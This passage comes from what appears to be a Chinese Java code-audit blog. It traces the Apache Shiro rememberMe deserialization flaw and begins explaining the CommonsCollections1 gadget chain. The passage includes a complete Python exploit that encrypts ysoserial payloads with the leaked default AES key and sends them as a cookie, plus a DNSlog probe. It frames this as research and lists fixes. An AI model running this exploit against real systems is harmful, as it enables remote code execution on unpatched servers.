readValue 方法，根据 Cookie 中的 name 字段（这个字段就是 rememberMe）获取 Cookie 的值</p><p>最终把获取cookie里面的rememberme 给到 value 返回上一级函数</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDE4NTIucG5n?x-oss-process=image/format,png" alt="image-20200902141852472"></p><p>回到getRememberedSerializedIdentity方法中，使用base64解密，成为二进制的数据，继续向上传递</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] decoded &#x3D; Base64.decode(base64);</span><br></pre></td></tr></table></figure><ul><li><p>再次回到AbstractRememberMeManager 类</p></li><li><p>下一个流程就是 convertBytesToPrincipals 方法，这就是对应加密的解析数据，中间肯定要解密数据，继续跟入</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDI3MTcucG5n?x-oss-process=image/format,png" alt="image-20200902142717154"></p></li></ul><p>进入发现了 decrypt（）函数，这就很明显就进行解密了，继续跟入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDI5NDUucG5n?x-oss-process=image/format,png" alt="image-20200902142945142"></p><h3 id="详细看看decrypt解密函数："><a href="#详细看看decrypt解密函数：" class="headerlink" title="详细看看decrypt解密函数："></a>详细看看decrypt解密函数：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getCipherService();老熟人了，获取加密方法：AES/CBC/PKCS5Padding</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDM0MTgucG5n?x-oss-process=image/format,png" alt="image-20200902143418030"></p><p>最后到这句话，获取老朋友AES的秘钥 getDecryptionCipherKey()后，带着秘文和AES公钥进入decrypt函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br></pre></td></tr></table></figure><p>跟进到了JcaCipherService的decrypt函数里面：分析一下里面的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] encrypted = ciphertext;</span><br><span class="line">    <span class="keyword">byte</span>[] iv = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isGenerateInitializationVectors(<span class="keyword">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> ivSize = <span class="keyword">this</span>.getInitializationVectorSize();</span><br><span class="line">            <span class="keyword">int</span> ivByteSize = ivSize / <span class="number">8</span>;</span><br><span class="line">            iv = <span class="keyword">new</span> <span class="keyword">byte</span>[ivByteSize];</span><br><span class="line">          </span><br><span class="line">          <span class="comment">//ivByteSize=16</span></span><br><span class="line">          <span class="comment">//ciphertext这个数组 0-16位 覆盖到 iv数组 ，相当于给 vi赋值 ciphertext的前16位</span></span><br><span class="line">            System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line">          </span><br><span class="line">          <span class="comment">// </span></span><br><span class="line">            <span class="keyword">int</span> encryptedSize = ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = <span class="keyword">new</span> <span class="keyword">byte</span>[encryptedSize];</span><br><span class="line">          </span><br><span class="line">           <span class="comment">// ciphertext数组 ，从 16位后面的数据 赋值给encrypted </span></span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">          </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">            String msg = <span class="string">"Unable to correctly extract the Initialization Vector or ciphertext."</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> CryptoException(msg, var8);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//进入下一层解密</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>追随到 JcaCipherService 的 decrypt 方法中，继续跟入 crypt 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key, <span class="keyword">byte</span>[] iv)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">"Attempting to decrypt incoming byte array of length "</span> + (ciphertext != <span class="keyword">null</span> ? ciphertext.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] decrypted = <span class="keyword">this</span>.crypt(ciphertext, key, iv, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> decrypted == <span class="keyword">null</span> ? <span class="keyword">null</span> : Util.bytes(decrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑到 JcaCipherService 中的 crypt 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] crypt(<span class="keyword">byte</span>[] bytes, <span class="keyword">byte</span>[] key, <span class="keyword">byte</span>[] iv, <span class="keyword">int</span> mode) <span class="keyword">throws</span> IllegalArgumentException, CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (key != <span class="keyword">null</span> &amp;&amp; key.length != <span class="number">0</span>) &#123;</span><br><span class="line">      </span><br><span class="line">   <span class="comment">//初始化cipher，再跟入就是 原生的 cipher.init 解密方法了</span></span><br><span class="line">        Cipher cipher = <span class="keyword">this</span>.initNewCipher(mode, key, iv, <span class="keyword">false</span>);</span><br><span class="line">      <span class="comment">// 基本完成解密</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.crypt(cipher, bytes);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"key argument cannot be null or empty."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密完成，序列化操作"><a href="#解密完成，序列化操作" class="headerlink" title="解密完成，序列化操作"></a>解密完成，序列化操作</h2><p>解密完成后，一步步的return回到上级函数，回到AbstractRememberMeManager 的 decrypt 方法，看一下数据 r00 开头 序列化的数据</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjE5NDcucG5n?x-oss-process=image/format,png" alt="image-20200902161947628"></p><p>向上return，看到deserialize 反序列化的方法了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjI2NDcucG5n?x-oss-process=image/format,png" alt="image-20200902162647497"></p><p>一直跟进到 DefaultSerializer 的 deserialize方法中，见到了久违的 readObject（）方法</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjI4MTkucG5n?x-oss-process=image/format,png" alt="image-20200902162819610"></p><h1 id="0x04-编写POC-EXP"><a href="#0x04-编写POC-EXP" class="headerlink" title="0x04 编写POC EXP"></a>0x04 编写POC EXP</h1><h2 id="本次AES加密的一些小知识点："><a href="#本次AES加密的一些小知识点：" class="headerlink" title="本次AES加密的一些小知识点："></a>本次AES加密的一些小知识点：</h2><ul><li>某些加密算法要求明文需要按一定长度对齐，叫做块大小(BlockSize)，我们这次就是16字节，那么对于一段任意的数据，加密前需要对最后一个块填充到16 字节，解密后需要删除掉填充的数据。</li><li>AES中有三种填充模式(PKCS7Padding/PKCS5Padding/ZeroPadding)</li><li>PKCS7Padding跟PKCS5Padding的区别就在于数据填充方式，PKCS7Padding是缺几个字节就补几个字节的0，而PKCS5Padding是缺几个字节就补充几个字节的几，好比缺6个字节，就补充6个字节的6</li></ul><p>加密流程就是：</p><ul><li><p>使用的 AES/CBC/PKCS5Padding 模式</p></li><li><p>random = this.ensureSecureRandom(); 使用随机数生成 ivBytes</p></li><li><p>key为预留的那个硬编码</p></li><li><p>encrypt(plaintext, key, ivBytes, generate) 生成</p></li><li><p>最后base64加密，放入cookie中</p></li></ul><p>解密流程可以知道：</p><ul><li><p>使用的 AES/CBC/PKCS5Padding 模式 ，所以Key要求是为16位的，key为预留的那个硬编码</p></li><li><p>base64解密cookie 中 rememberMe的值</p></li><li><p>根据解密 vi 是 秘文的前16位</p></li><li><p>iv即为rememberMe解码后的前16个字节</p></li><li><p>有了key 和 vi 就可以解密到反序列化的数据了</p></li></ul><p>那POC的我们的加密流程就是：</p><ol><li>获取到 反序列化的数据</li><li>设置AES加密模式，使用AES.MODE_CBC的分块模式</li><li>设置硬编码的 key</li><li>使用随机数生成 16 字节的 iv</li><li>使用 iv + AES加密(反序列化数据) 拼接</li><li>最后base64加密全部内容</li></ol><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这里主要导入的是这个版本的apache.commons</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-collections4&lt;&#x2F;artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0&lt;&#x2F;version&gt;</span><br></pre></td></tr></table></figure><p>所以我们EXP利用CommonsCollections2 的利用链</p><p>主要依靠ysoserial生成利用的反序列化数据，然后根据加密的思路，把利用链加进去。</p><h2 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    <span class="comment"># 这里使用CommonsCollections2模块</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'CommonsCollections2'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露的key</span></span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AES的CBC加密模式</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span></span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化一个加密方式为上述的对象</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span></span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span></span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dnslog</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'URLDNS'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># cc2的exp</span></span><br><span class="line">    payload = encode_rememberme(<span class="string">'/System/Applications/Calculator.app/Contents/MacOS/Calculator'</span>)</span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># dnslog的poc</span></span><br><span class="line">    payload1 = encode_rememberme(<span class="string">'http://ca4qki.dnslog.cn/'</span>)</span><br><span class="line">    print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload1.decode()))</span><br><span class="line"></span><br><span class="line">    cookie = &#123;</span><br><span class="line">        <span class="string">"rememberMe"</span>: payload.decode()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    requests.get(url=<span class="string">"http://127.0.0.1:8080/web_war/"</span>, cookies=cookie)</span><br></pre></td></tr></table></figure><h1 id="0x05-修复"><a href="#0x05-修复" class="headerlink" title="0x05 修复"></a>0x05 修复</h1><p>1.升级Shiro到最新版</p><p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p><p>3.WAF拦截Cookie中长度过大的rememberMe值</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>本次是用ysoserial直接生成序列化内容，而且使用CommonsCollections2这个利用链，只是简单的直接利用，但是实际利用情况十分复杂，关乎java的版本还有各种组件的版本，想要一个完美的利用链还是得自己改造，准备下一篇文章，再研究各种利用链的情况，和改造各种利用链适配问题。</p><h1 id="0x07-小trips："><a href="#0x07-小trips：" class="headerlink" title="0x07 小trips："></a>0x07 小trips：</h1><p>如何搜索lib包里面的东西呢？</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIwOTEzMjMucG5n?x-oss-process=image/format,png" alt="image-20200902091323860"></p><p>双击shift , 调出全局搜索框就可以搜索到 jar包里的类了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计：反序列化链CommonsCollections1详解</title>
      <link href="/2020/08/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BECommonsCollections1%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/08/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BECommonsCollections1%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h1><p>Apache Commons Collections是一个第三方的基础类库，提供了很多强有力的数据结构类型并且实现了各种集合工具类，可以说是apache开源项目的重要组件。</p><p>CommonsCollection在java反序列化的源流中已经存在5年</p><p>今天介绍的CommonsCollections1，反序列化的第一种RCE序列化链</p><p>CommonsCollections1反序列化漏洞点仍然是commons-collections-3.1版本</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>maven的pom导入依赖</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"> &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><ul><li><p>此实验Java版本，在Java 8u71以后的版本中修改了触发的类，所以不支持此链的利用</p></li><li><p>MACBOOK</p></li><li><p>IDEA 2020</p></li></ul><p>此次实验代码：</p><p><a href="https://github.com/godzeo/javasec\_code\_study/tree/master/src/main/java/CommonCollections" target="_blank" rel="noopener">https://github.com/godzeo/javasec\_code\_study/tree/master/src/main/java/CommonCollections</a></p><h1 id="0x03-构造链-基础知识"><a href="#0x03-构造链-基础知识" class="headerlink" title="0x03 构造链-基础知识"></a>0x03 构造链-基础知识</h1><p>看完之后，大概会总结一下，需要了解这⼏个接⼝和类的知识点</p><p>首先要从Transformer类开始</p><h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer它只是⼀个接⼝，只有⼀个待实现的⽅法：它的作用我感觉就是总接口吧</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.commons.collections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h2><p>TransformedMap在利用链中个人理解：是一个触发器，主要是后面类中的 实现类的Transformer（）方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(map);</span><br><span class="line">    <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>它是基本的数据类型Map类的做⼀个修饰，被修饰过的Map在添加新的元素时，将可以执⾏⼀个函数。</li><li>这个函数，就是⼀个实现了Transformer接⼝的类，这个类也就是链中导向下一环的入口。</li><li>第一个参数，要绑定修饰的map，第三个参数就是 valueTransformer就是要执行的Transformer接⼝的类。</li></ul><h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><ul><li><p>ChainedTransformer就是实现了Transformer接⼝的⼀个类</p></li><li><p>它就可以承接下一步的操作。</p></li><li><p>它的主要作⽤：</p></li><li><p>将内部的多个Transformer串在⼀起</p></li><li><p>就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊</p></li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjUxNjQyMjEucG5n?x-oss-process=image/format,png" alt="image-20200825164221874"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"> .......</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><ul><li><p>ConstantTransformer是实现了Transformer接⼝的⼀个类</p><ul><li>简单就是你输入什么类，它就返回什么</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><ul><li>这个类就是代码执行的关键了</li><li>这个类的实现主要采用了反射的方法</li><li>简单的说：可以通过这个类反射实例化调用其他类其他方法（任意的方法，也就是命令执行）</li><li>只要参数可控，就是任意命令执行</li></ul><p>看一下代码，其实就是反射的代码，给封装到transform方法里面了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span 